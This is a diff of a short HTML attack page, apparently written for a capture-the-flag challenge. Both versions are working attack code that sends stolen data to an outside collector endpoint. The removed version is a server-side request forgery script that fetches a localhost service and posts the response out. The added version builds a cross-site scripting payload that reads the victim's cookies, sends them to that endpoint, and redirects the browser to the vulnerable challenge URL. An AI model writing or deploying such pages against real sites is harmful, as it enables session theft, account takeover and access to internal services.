@@ -1,32 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSRF Exploit</title>
+    <title>Cookie Exfiltration</title>
     <script>
-        (async function() {
-            try {
-                // Fetch data from localhost:5000
-                const response = await fetch('http://localhost:5000');
-                const data = await response.text();
-
-                // Send the fetched data to your custom endpoint
-                await fetch('https://ssrf-eta.vercel.app/api/capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ response: data })
-                });
-            } catch (error) {
-                // Send error details to your custom endpoint
-                await fetch('https://ssrf-eta.vercel.app/api/capture', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ error: error.message })
-                });
-            }
-        })();
+        // Redirect to the vulnerable endpoint with XSS payload
+        const xssPayload = '"; fetch("https://ssrf-eta.vercel.app/api/capture?cookies=" + encodeURIComponent(document.cookie)); //';
+        const targetUrl = 'http://chal1.lagncra.sh:8426/?lang=' + encodeURIComponent(xssPayload);
+        
+        window.location.href = targetUrl;
     </script>
 </head>
 <body>
-    <p>Fetching localhost...</p>
+    <p>Redirecting to extract cookies...</p>
 </body>
 </html>
